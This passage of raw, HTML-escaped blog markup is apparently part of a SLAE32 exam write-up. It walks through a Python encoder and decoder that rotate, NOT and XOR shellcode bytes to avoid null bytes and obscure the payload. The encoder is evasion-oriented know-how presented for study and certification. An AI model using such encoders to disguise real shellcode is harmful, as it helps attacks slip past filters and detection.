    &lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ROT_EVEN&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;shellcode_length_most_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_length_most_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ROT_ODD&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;The Least/Most Significant Bytes are XOR-ed with &lt;code&gt;ROT_EVEN&lt;/code&gt;/&lt;code&gt;ROT_ODD&lt;/code&gt; in order to avoid &lt;strong&gt;null bytes&lt;/strong&gt;, e.g. shellcode of 256 bytes -&amp;gt; &lt;code&gt;0x0100&lt;/code&gt;
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Rotations for even-index bytes: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROT_EVEN&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; (hex: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROT_EVEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Rotations for odd-index bytes: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROT_ODD&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; (hex: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROT_ODD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Least Significant Byte of Shellcode Length XOR-ed with ROT_EVEN: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; (hex: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Most Significant Byte of Shellcode Length XOR-ed with ROT_ODD: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_length_most_byte&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; (hex: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_length_most_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROT_EVEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROT_ODD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_length_most_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Some auxialiary bytes are prepended to the encoded shellcode, in order for the decoder stub to decode it
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Helper bytes for decoding (HEX): &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# 1. Rotate bytes
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#   1.1. EVEN index -&amp;gt; Rotate to the Right ROT_EVEN times
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#   1.2. ODD index -&amp;gt; Rotate to the Left ROT_ODD times
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# 2. NOT each byte
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# 3. XOR each byte with the Least Significant Byte of the shellcode length
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#   (shellcode_length_least_byte), which is XOR-ed with ROT_EVEN to avoid null_bytes
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[#] Encoding ...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;enumerate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# even index byte
&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;# print(f&quot;[+] EVEN | Original byte: {hex(byte)}&quot;)
&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitwise_ror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ROT_EVEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# print(f&quot;[+] EVEN | Rotated byte: {hex(encoded_byte)}&quot;)
&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitwise_not&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# print(f&quot;[+] EVEN | NOT-ed byte: {hex(encoded_byte)}&quot;)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;ROR/ROL functions are taken from &lt;a href=&quot;https://www.falatic.com/index.php/108/python-and-bitwise-rotation&quot;&gt;Technological Masochism&lt;/a&gt;
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;# print(f&quot;[+] EVEN | Xored byte: {hex(encoded_byte)}\n&quot;)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Avoid XOR-ing bytes equal to &lt;code&gt;shellcode_length_least_byte&lt;/code&gt;, as it would result in &lt;code&gt;NULL&lt;/code&gt; bytes
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# odd index byte
&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;# print(f&quot;[+] ODD | Original byte: {hex(byte)}&quot;)
&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitwise_rol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ROT_ODD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# print(f&quot;[+] ODD | Rotated byte: {hex(encoded_byte)}&quot;)
&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitwise_not&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# print(f&quot;[+] ODD | NOT-ed byte: {hex(encoded_byte)}&quot;)
&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;# print(f&quot;[+] ODD | Xored byte: {hex(encoded_byte)}\n&quot;)
&lt;/span&gt;        
        &lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;The program fails if &lt;code&gt;NULL&lt;/code&gt; bytes are present in the encoded shellcode
&lt;/sub&gt;&lt;/p&gt;
&lt;p&gt;I ran the script multiple times with larger shellcodes, so I'm pretty sure (like ~98%) that the encoded shellcode won't contain &lt;code&gt;NULL&lt;/code&gt; bytes.&lt;/p&gt;
&lt;p&gt;The full script is stored on GitHub at &lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/4/encoder.py&quot;&gt;rbctee/SlaeExam&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;python-decoder&quot;&gt;Python Decoder&lt;/h2&gt;
&lt;p&gt;Inside the previous &lt;code&gt;python&lt;/code&gt; script I also implemented a function that decodes the encoded shellcode:&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decode_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;decoded_shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ROT_EVEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ROT_ODD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;shellcode_length_most_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encoded_shellcode_main&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Extract the &lt;strong&gt;auxiliary bytes&lt;/strong&gt; prepended to the encoded shellcode
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[#] Decoding ...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;enumerate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_shellcode_main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            	&lt;span class=&quot;n&quot;&gt;decoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Check if the index is &lt;code&gt;odd&lt;/code&gt;/&lt;code&gt;even&lt;/code&gt;. Moreover, if the encoded byte is equal to the &lt;code&gt;Least Significant Byte&lt;/code&gt; of the shellcode's length, then ignore it
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            	&lt;span class=&quot;n&quot;&gt;decoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;decoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitwise_not&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decoded_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;decoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitwise_rol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decoded_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ROT_EVEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            	&lt;span class=&quot;n&quot;&gt;decoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_length_least_byte&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            	&lt;span class=&quot;n&quot;&gt;decoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded_byte&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;decoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitwise_not&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decoded_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;decoded_byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitwise_ror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decoded_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ROT_ODD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;decoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decoded_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Decoded shellcode (HEX): &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decoded_shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decoded_shellcode&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;For every byte of the encoded shellcode, the function does the following:&lt;/p&gt;
&lt;ol&gt;
